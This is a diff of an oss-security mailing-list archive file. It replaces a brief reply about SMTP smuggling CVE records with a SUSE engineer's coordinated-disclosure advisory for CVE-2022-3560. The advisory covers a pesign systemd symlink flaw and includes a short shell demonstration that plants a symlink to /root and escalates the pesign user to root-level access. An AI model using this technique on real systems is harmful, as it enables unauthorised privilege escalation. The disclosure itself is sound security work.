@@ -1,31 +1,90 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2023/12/30/1
-Message-ID: <20231230161120.GE24652@suse.de>
-Date: Sat, 30 Dec 2023 17:11:22 +0100
-From: Marcus Meissner <meissner@...e.de>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2023/02/01/2
+Message-ID: <Y9o5fXKqZDxOHbNe@kasco.suse.de>
+Date: Wed, 1 Feb 2023 11:05:49 +0100
+From: Matthias Gerstner <mgerstner@...e.de>
 To: oss-security@...ts.openwall.com
-Cc: Claus Assmann <ml+oss@...tp.org>
-Subject: Re: Re: New SMTP smuggling attack
+Subject: Re: pesign: Local privilege escalation on pesign systemd service
 Content-Type: text/plain; charset=utf-8
 
-On Fri, Dec 29, 2023 at 12:50:55PM -0800, Alan Coopersmith wrote:
-> On 12/26/23 11:15, Claus Assmann wrote:
-> > On Sun, Dec 24, 2023, Marcus Meissner wrote:
-> > 
-> > > - CVE-2023-51765 sendmail
-> > 
-> > Can you update the text for this (or point me to the proper way/persons
-> > to do this)?
-> 
-> https://www.cve.org/CVERecord?id=CVE-2023-51765 shows:
->   Assigner: MITRE Corporation
-> 
-> so you can submit updates/corrections via the web form at:
->   https://cveform.mitre.org/
+Hi,
 
-Yes please use this form, or if you do not want one of us can do it.
+On Tue, Jan 31, 2023 at 12:59:19PM -0300, Marco Benatto wrote:
+> a local privilege escalation vulnerability was found in pesign. This
+> vulnerability has been identified by CVE-2022-3560.
 
-I did not request the sendmail and exim CVEs, also the postfix CVE seems
-not my proposed description, so I guess someone else requested them.
+I would like to add some more details about the vulnerability:
 
-Ciao, Marcus
+The project ships a systemd service file that starts a pesign daemon
+instance but also runs a StartPost script:
+
+```
+ExecStart=/usr/bin/pesign --daemonize
+ExecStartPost=/usr/libexec/pesign/pesign-authorize
+```
+
+This pesign-authorize script is run with root privileges and grants a
+dynamic list of users and groups recursively full access to
+/etc/pki/pesign*/ and /run/pesign via POSIX access control lists.
+
+The list of users is found in the root controlled files
+/etc/pesign/users and /etc/pesign/groups. By default only pesign:pesign
+are configured.
+
+# The Vulnerability
+
+Since the pesign-authorize script is run at every start of the pesign
+service unit, the directory trees /etc/pki/pesign* and /run/pesign will
+already be controlled by the unprivileged pesign:pesign user and group.
+The script does not take precautions to prevent symlink attacks being
+staged by a compromised unprivileged user account.
+
+A simple demonstration of the attack would be this:
+
+```
+root# sudo -u pesign -g pesign ln -s /root /etc/pki/pesign/attack
+root# systemctl restart pesign
+root# getfactl /root
+# file: root/
+# owner: root
+# group: root
+user::rwx
+user:pesign:rwx
+group::---
+group:pesign:rwx
+mask::rwx
+other::---
+```
+
+Therefore in a default configuration of pesign there is a local pesign
+user or pesign group to root escalation that can be achieved at every
+pesign.service unit start.
+
+I reproduced this on Fedora 35 using pesign version 113 release 18.fc35.
+
+# Timeline
+
+- 2022-10-11: I reported this to secalert@...hat.com  offering
+  coordinated disclosure.
+- 2022-10-18: RedHat security assigned the CVE for the issue
+- 2022-12-21: RedHat security communicated a coordinated release date
+  for 2023-01-31.
+- 2023-01-27: RedHat security shared the patch with us and informed the
+  distros mailing list about issue and the upcoming release
+- 2023-01-31: the issue has been published
+
+Cheers
+
+Matthias
+
+-- 
+Matthias Gerstner <matthias.gerstner@...e.de>
+Security Engineer
+https://www.suse.com/security
+GPG Key ID: 0x14C405C971923553
+ 
+SUSE Software Solutions Germany GmbH
+HRB 36809, AG Nürnberg
+Geschäftsführer: Ivo Totev, Andrew Myers, Andrew McDonald, Boudien Moerman
+
+Download attachment "signature.asc" of type "application/pgp-signature" (834 bytes)
